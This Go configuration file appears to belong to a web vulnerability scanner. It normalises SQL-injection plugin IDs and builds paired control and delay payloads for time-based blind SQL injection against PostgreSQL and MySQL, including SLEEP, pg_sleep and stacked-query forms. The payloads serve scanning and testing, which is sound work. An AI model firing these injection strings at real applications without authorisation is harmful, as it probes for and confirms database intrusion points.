package config

import "strings"

// Legacy rule buckets stay editable and are consumed by the two public SQL
// plugins. Only selection IDs are consolidated; custom payloads are retained.
func NormalizeSQLPluginIDs(ids []string, normal bool) []string {
	if ids == nil {
		return nil
	}
	result := make([]string, 0, len(ids))
	seen := make(map[string]bool)
	for _, id := range ids {
		id = strings.TrimSpace(id)
		switch id {
		case "sqli_extended":
			if normal {
				id = "sqli"
			} else {
				id = "sqli_deep"
			}
		case "sqli_timing", "sqli_order_by", "sqli_limit", "mybatis_dynamic_sql":
			id = "sqli_deep"
		}
		if !seen[id] {
			result = append(result, id)
			seen[id] = true
		}
	}
	if seen["sqli_deep"] || seen["all"] {
		filtered := result[:0]
		for _, id := range result {
			if id != "sqli" {
				filtered = append(filtered, id)
			}
		}
		result = filtered
	}
	return result
}

func repairSQLTimingControls(rules map[string]PluginRuleConfig) {
	rule := rules["sqli_timing"]
	for i := range rule.Payloads {
		p := &rule.Payloads[i]
		// Historical built-in varied BOTH delay and Boolean truth, confounding
		// row count/workload with sleep. Change only this exact legacy default.
		if p.Group == "mysql-sleep-or-select-string" && p.Kind == "time_delay" &&
			p.Payload == "{{value}}' OR (SELECT SLEEP(3)) OR '731'='731" {
			p.Payload = "{{value}}' OR (SELECT SLEEP(3)) OR '731'='732"
		}
	}
	rules["sqli_timing"] = rule
}

func addSQL381TimingRules(rules map[string]PluginRuleConfig) {
	rule := rules["sqli_timing"]
	// {delay} is a construction placeholder only. Persisted pairs contain
	// literal 0/3, so existing rule editing/export remains compatible.
	forms := []struct{ group, payload string }{
		{"postgres-reported-tail-exact-replace", "' AND (SELECT 1 FROM pg_sleep({delay})) AND '1'='2"},
		{"postgres-parenthesis-tail-exact-replace", "') AND 5014=(SELECT 5014 FROM pg_sleep({delay})) AND ('1'='1"},
		{"postgres-balanced-tail-exact-replace", "' AND 5014=(SELECT 5014 FROM pg_sleep({delay})) AND '1'='1"},
		{"postgres-balanced-tail-append", "{{value}}' AND 5014=(SELECT 5014 FROM pg_sleep({delay})) AND '1'='1"},
		{"postgres-parenthesis-tail-append", "{{value}}') AND 5014=(SELECT 5014 FROM pg_sleep({delay})) AND ('1'='1"},
		{"mysql-parenthesis-tail-exact-replace", "') AND (SELECT SLEEP({delay})) AND ('1'='1"},
		{"mysql-parenthesis-tail-append", "{{value}}') AND (SELECT SLEEP({delay})) AND ('1'='1"},
		{"postgres-double-parenthesis-append", "{{value}}')) AND 5014=(SELECT 5014 FROM pg_sleep({delay}))-- "},
		{"mysql-double-parenthesis-append", "{{value}}')) AND (SELECT SLEEP({delay}))=0-- "},
		{"postgres-like-tail-append", "{{value}}%' AND 5014=(SELECT 5014 FROM pg_sleep({delay})) AND '%'='"},
		{"mysql-like-tail-append", "{{value}}%' AND (SELECT SLEEP({delay}))=0 AND '%'='"},
		{"postgres-concat-append", "{{value}}'||(SELECT '' FROM pg_sleep({delay}))||'"},
		{"mysql-xor-append", "{{value}}' XOR (SELECT SLEEP({delay})) XOR '1"},
		{"postgres-or-tail-exact-replace", "' OR 5014=(SELECT 5014 FROM pg_sleep({delay})) OR '1'='2"},
		{"postgres-stacked-string", "{{value}}'; SELECT pg_sleep({delay});-- "},
		{"postgres-stacked-numeric", "{{value}}; SELECT pg_sleep({delay});-- "},
		{"mysql-stacked-string", "{{value}}'; SELECT SLEEP({delay});-- "},
		{"mysql-stacked-numeric", "{{value}}; SELECT SLEEP({delay});-- "},
	}
	for _, form := range forms {
		for _, side := range []struct{ kind, delay string }{{"time_control", "0"}, {"time_delay", "3"}} {
			rule.Payloads = append(rule.Payloads, PayloadRule{Name: form.group + " " + side.delay + "s", Kind: side.kind, Group: form.group,
				Payload: strings.ReplaceAll(form.payload, "{delay}", side.delay), Expected: "3"})
		}
	}
	rules["sqli_timing"] = rule
	repairSQLTimingControls(rules)
}
